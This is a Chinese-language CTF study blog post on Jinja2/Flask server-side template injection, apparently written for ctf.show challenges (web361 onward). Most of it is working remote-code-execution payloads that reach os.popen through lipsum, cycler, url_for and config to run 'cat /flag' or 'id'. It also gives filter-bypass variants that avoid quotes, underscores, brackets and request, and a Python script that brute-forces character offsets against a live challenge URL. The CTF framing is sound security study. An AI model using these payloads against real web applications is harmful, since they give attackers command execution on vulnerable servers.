<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(()|select|string)[24]~</span><br><span class="line">(()|select|string)[24]~</span><br><span class="line">(()|select|string)[15]~</span><br><span class="line">(()|select|string)[20]~</span><br><span class="line">(()|select|string)[6]~</span><br><span class="line">(()|select|string)[18]~</span><br><span class="line">(()|select|string)[18]~</span><br><span class="line">(()|select|string)[24]~</span><br><span class="line">(()|select|string)[24]</span><br><span class="line"></span><br><span class="line">得到字符串&quot;__class__&quot;</span><br></pre></td></tr></table></figure>
<h2 id="list"><strong>list</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Convert the value into a list. If it was a string the returned list will be a list of characters.</span><br></pre></td></tr></table></figure>
<p>转换成列表<br>
更多的用途是配合上面的string转换成列表，就可以调用列表里面的方法取字符了<br>
只是单纯的字符串的话取单个字符方法有限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(()|select|string)[0]</span><br><span class="line">如果中括号被过滤了，挺难的</span><br><span class="line">但是列表的话就可以用pop取下标了</span><br><span class="line">当然都可以使用__getitem__</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(()|select|string|list).pop(0)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a/b)</span><br><span class="line">request.json		 post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;</span><br></pre></td></tr></table></figure>
<p>过滤器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">int()：将值转换为int类型；</span><br><span class="line"></span><br><span class="line">float()：将值转换为float类型；</span><br><span class="line"></span><br><span class="line">lower()：将字符串转换为小写；</span><br><span class="line"></span><br><span class="line">upper()：将字符串转换为大写；</span><br><span class="line"></span><br><span class="line">title()：把值中的每个单词的首字母都转成大写；</span><br><span class="line"></span><br><span class="line">capitalize()：把变量值的首字母转成大写，其余字母转小写；</span><br><span class="line"></span><br><span class="line">trim()：截取字符串前面和后面的空白字符；</span><br><span class="line"></span><br><span class="line">wordcount()：计算一个长字符串中单词的个数；</span><br><span class="line"></span><br><span class="line">reverse()：字符串反转；</span><br><span class="line"></span><br><span class="line">replace(value,old,new)： 替换将old替换为new的字符串；</span><br><span class="line"></span><br><span class="line">truncate(value,length=255,killwords=False)：截取length长度的字符串；</span><br><span class="line"></span><br><span class="line">striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；</span><br><span class="line"></span><br><span class="line">escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。</span><br><span class="line"></span><br><span class="line">safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;；</span><br><span class="line"></span><br><span class="line">list()：将变量列成列表；</span><br><span class="line"></span><br><span class="line">string()：将变量转换成字符串；</span><br><span class="line"></span><br><span class="line">join()：将一个序列中的参数值拼接成字符串。示例看上面payload；</span><br><span class="line"></span><br><span class="line">abs()：返回一个数值的绝对值；</span><br><span class="line"></span><br><span class="line">first()：返回一个序列的第一个元素；</span><br><span class="line"></span><br><span class="line">last()：返回一个序列的最后一个元素；</span><br><span class="line"></span><br><span class="line">format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()：返回一个序列或者字典的长度；</span><br><span class="line"></span><br><span class="line">sum()：返回列表内数值的和；</span><br><span class="line"></span><br><span class="line">sort()：返回排序后的列表；</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。</span><br><span class="line"></span><br><span class="line">length()返回字符串的长度，别名是count</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>各种魔法方法</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__getitem__</span><br><span class="line">obj[key]  ≡  obj.__getitem__(key)</span><br></pre></td></tr></table></figure>
<h1>模板1</h1>
<p>ssti模板注入的起点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lipsum、cycler、joiner、namespace和()、&#x27;&#x27;、&quot;&quot;等</span><br><span class="line">&#123;&#123; lipsum.__globals__.os.popen(&#x27;id&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; cycler.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; joiner.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; namespace.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; ().__class__.__mro__[1].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>起点对象</th>
<th>类型</th>
<th>利用路径</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>lipsum</code></td>
<td>函数</td>
<td><code>.__globals__['os']</code></td>
</tr>
<tr>
<td><code>cycler</code></td>
<td>类</td>
<td><code>.__init__.__globals__['os']</code></td>
</tr>
<tr>
<td><code>joiner</code></td>
<td>函数</td>
<td><code>.__globals__['os']</code></td>
</tr>
<tr>
<td><code>namespace</code></td>
<td>函数</td>
<td><code>.__globals__['os']</code></td>
</tr>
<tr>
<td><code>().__class__</code></td>
<td>对象</td>
<td><code>.__mro__[1].__subclasses__()</code> 链式绕</td>
</tr>
<tr>
<td><code>url_for</code></td>
<td>函数</td>
<td><code>.__globals__['os']</code></td>
</tr>
</tbody>
</table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">初版</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac /flag&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">x——builtins版</span><br><span class="line">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">lipsum版</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(request.args.ocean).read()&#125;&#125;&amp;ocean=cat /flag</span><br><span class="line"></span><br><span class="line">get参数版——直接globals</span><br><span class="line">&#123;&#123;url_for.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag</span><br><span class="line">get传参版——lipsum</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(request.args.ocean).read()&#125;&#125;&amp;ocean =cat /flag</span><br><span class="line">get传参无args版(atgs换成values)</span><br><span class="line">&#123;&#123;lipsum.__globals__.os.popen(request.values.ocean).read()&#125;&#125;&amp;ocean=cat /flag</span><br><span class="line">get传参无args版(atgs换成Cookie)（参数写在cookie当中用分号隔开）</span><br><span class="line">&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;</span><br><span class="line">a=os;b=popen;c=cat /flag</span><br><span class="line"></span><br><span class="line">config拼接版</span><br><span class="line">&#123;&#123;url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]&#125;&#125;</span><br><span class="line">等于：&#123;&#123;url_for.__globals__[&#x27;os&#x27;]&#125;&#125;</span><br><span class="line">%2B是+</span><br><span class="line"></span><br><span class="line">无引号、无下划线</span><br><span class="line">&#123;&#123;lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()&#125;&#125;&amp;ocean=cat /flag&amp;a=__globals__&amp;b=__getitem__&amp;c=os&amp;d=popen&amp;f=read</span><br><span class="line">相当于：lipsum.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br><span class="line"></span><br><span class="line">&#123;&#123;lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()&#125;&#125;&amp;ocean=cat /flag&amp;a=__globals__&amp;b=__getitem__&amp;c=os&amp;d=popen&amp;f=read</span><br><span class="line">相当于：lipsum.__globals__.__getiem__(&#x27;os&#x27;).[&#x27;popen&#x27;](&#x27;/cat /flag&#x27;).read()</span><br><span class="line">如果过滤了&#123;&#123;&#125;&#125;，直接换成&#123;%print()%&#125;:</span><br><span class="line">&#123;%print(lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)())%&#125;&amp;ocean=cat /flag&amp;a=__globals__&amp;b=__getitem__&amp;c=os&amp;d=popen&amp;f=read</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">综上模板request可以通杀，因为我们可以通过request来传参，而参数独立与&#123;&#123;&#125;&#125;之外</span><br></pre></td></tr></table></figure>
<h1>模板2</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤单双引号、args、中括号[]、下划线、os、&#123;&#123;、request</span><br></pre></td></tr></table></figure>
<p>关键是过滤了request</p>
<p>绕过方法就是使用 365 题的字符串拼接，但是下划线被 ban，<strong>str</strong>()不能用，需要用 string 过滤器得到 config 字符串：config|string，但是获得字符串后本来应该用中括号或者__getitem__()，但是问题是_被ban了，所以获取字符串中的某个字符比较困难，这里转换成列表，再用列表的pop方法就可以成功得到某个字符了，在跑字符的时候发现没有小写的b，只有大写的B，所以再去一层.lower()方法，方便跑更多字符<br>
原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120493997">https://blog.csdn.net/q20010619/article/details/120493997</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭SSL警告</span></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://4adba2d6-7c76-4a18-936b-ba722cbefdc9.challenge.ctf.show/?name=&#123;&#123;%print(config|string|list).pop(&#123;&#125;).lower()%&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;__globals__&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;os&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;cat /flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">        r = requests.get(url=url.<span class="built_in">format</span>(i), headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">        location = r.text.find(<span class="string">&quot;&lt;h3&gt;&quot;</span>)</span><br><span class="line">        word = r.text[location + <span class="number">4</span>:location + <span class="number">5</span>]</span><br><span class="line">        <span class="keyword">if</span> word == j.lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;(config|string|list).pop(%d).lower() == %s&quot;</span> % (i, j))</span><br><span class="line">            result += <span class="string">&quot;(config|string|list).pop(%d).lower()~&quot;</span> % i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result[:-<span class="number">1</span>])  <span class="comment"># 去掉最后一个 ~</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># __globals__</span></span><br><span class="line"><span class="comment"># (config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()</span></span><br><span class="line"><span class="comment"># os</span></span><br><span class="line"><span class="comment"># (config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()</span></span><br><span class="line"><span class="comment"># cat /flag</span></span><br><span class="line"><span class="comment"># (config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()</span></span><br><span class="line"><span class="comment"># 通过字符串拼接符号~链接</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 原来的：lipsum.__globals__[&quot;os&quot;].popen(&quot;cat /flag&quot;).read()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 通过修改的：&#123;%print(lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read()%&#125;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   来个明显一点的：</span></span><br><span class="line"><span class="comment">#  &#123;% print(</span></span><br><span class="line"><span class="comment">#     lipsum</span></span><br><span class="line"><span class="comment">#     | attr(</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(74).lower() ~  # &#x27;_&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(74).lower() ~  # &#x27;_&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(6).lower()  ~  # &#x27;g&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(41).lower() ~  # &#x27;l&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(2).lower()  ~  # &#x27;o&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(33).lower() ~  # &#x27;b&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(40).lower() ~  # &#x27;a&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(41).lower() ~  # &#x27;l&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(42).lower() ~  # &#x27;s&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(74).lower() ~  # &#x27;_&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(74).lower()     # &#x27;_&#x27;</span></span><br><span class="line"><span class="comment">#     )</span></span><br><span class="line"><span class="comment">#     .get(</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(2).lower() ~     # &#x27;o&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(42).lower()      # &#x27;s&#x27;</span></span><br><span class="line"><span class="comment">#     )</span></span><br><span class="line"><span class="comment">#     .popen(</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(1).lower()  ~  # &#x27;c&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(40).lower() ~  # &#x27;a&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(23).lower() ~  # &#x27;t&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(7).lower()  ~  # &#x27; &#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(279).lower()~  # &#x27;/&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(4).lower()  ~  # &#x27;f&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(41).lower() ~  # &#x27;l&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(40).lower() ~  # &#x27;a&#x27;</span></span><br><span class="line"><span class="comment">#         (config | string | list).pop(6).lower()     # &#x27;g&#x27;</span></span><br><span class="line"><span class="comment">#     )</span></span><br><span class="line"><span class="comment">#     .read()</span></span><br><span class="line"><span class="comment"># ) %&#125;</span></span><br><span class="line"><span class="comment">#&#123;%print((lipsum|attr(&#x27;__globals__&#x27;).get(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())%&#125;</span></span><br><span class="line"><span class="comment">#&#123;%print(__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read())</span></span><br><span class="line"><span class="comment">#%&#125;</span></span><br></pre></td></tr></table></figure>
<p>还有两个在<a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/120493997%E6%97%A0%E5%9B%9E%E6%98%BE%E8%BF%87%E6%BB%A4count%E3%80%81%E6%97%A0%E5%9B%9E%E6%98%BE">https://blog.csdn.net/q20010619/article/details/120493997无回显过滤count、无回显</a></p>
<h1>web361</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti</p>
<ul>
<li><code>__class__</code></li>
</ul>
<p>万物皆对象，而<strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class 'str'&gt;</code>。</p>
<ul>
<li><code>__bases__</code></li>
</ul>
<p>以元组的形式返回一个类所直接继承的类。</p>
<ul>
<li><code>__base__</code></li>
</ul>
<p>以字符串返回一个类所直接继承的类。</p>
<ul>
<li><code>__mro__</code></li>
</ul>
<p>返回解析方法调用的顺序。</p>
<ul>
<li><code>__subclasses__()</code></li>
</ul>
<p>获取类的所有子类。</p>
<ul>
<li><code>__init__</code></li>
</ul>
<p>所有自带带类都包含<strong>init</strong>方法，便于利用他当跳板来调用<strong>globals</strong>。</p>
<ul>
<li><code>__globals__</code></li>
</ul>
<p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。</p>
<p><img src="/2025/03/06/SSTI/image-20250306204920105.png" alt="image-20250306204920105"></p>
<p>使用os._wrap_close</p>
<p><strong>通过 <code>class</code> 跳转到类</strong></p>
<p><code>class</code> -&gt; <code>mro</code> -&gt; <code>subclasses</code> -&gt; <code>init</code> -&gt; <code>globals</code>是一种常见的利用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__  # 返回 &lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>
<p><code>__class__</code>，攻击者可以从一个已知的对象（如空字符串 <code>&quot;&quot;</code> 或数字 <code>0</code>）跳转到它的类，进而利用类的属性和方法（如 <code>__mro__</code>、<code>__subclasses__</code> 等）来进一步探索和利用。</p>
<p><strong>通过 <code>mro</code> 获取继承链</strong>    	 <strong>跳转到 <code>object</code> 类</strong></p>
<p>通过 <code>__mro__</code>，攻击者可以访问 <code>object</code> 类，然后通过 <code>__subclasses__</code> 获取所有已加载的子类。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()  # 返回 object 的所有子类</span><br></pre></td></tr></table></figure>
<p><code>__subclasses__</code> 的作用是让攻击者能够遍历所有已加载的类，寻找可以利用的类（如包含危险函数的类）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注意：</span><br><span class="line">&quot;&quot;.__class__.__mro__[1]  # 返回 &lt;class &#x27;object&#x27;&gt;</span><br><span class="line">&quot;&quot;.__class__.__mro__[0]  # 返回 &lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>
<p><code>__subclasses__</code> 的作用是让攻击者能够遍历所有已加载的类，寻找可以利用的类（如包含危险函数的类）。</p>
<p>通过 <code>__subclasses__</code>，攻击者可以找到一个可以利用的子类，然后通过 <code>__init__</code> 访问该类的初始化方法。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[1].__subclasses__()[X].__init__  # 返回某个子类的 __init__ 方法</span><br></pre></td></tr></table></figure>
<p><code>__init__</code> 的作用是让攻击者能够访问类的构造函数，从而进一步访问 <code>__globals__</code>。</p>
<p><code>__init__</code>在调用某函数前会被使用，所以使用<code>__init__</code>是为了给global做铺垫</p>
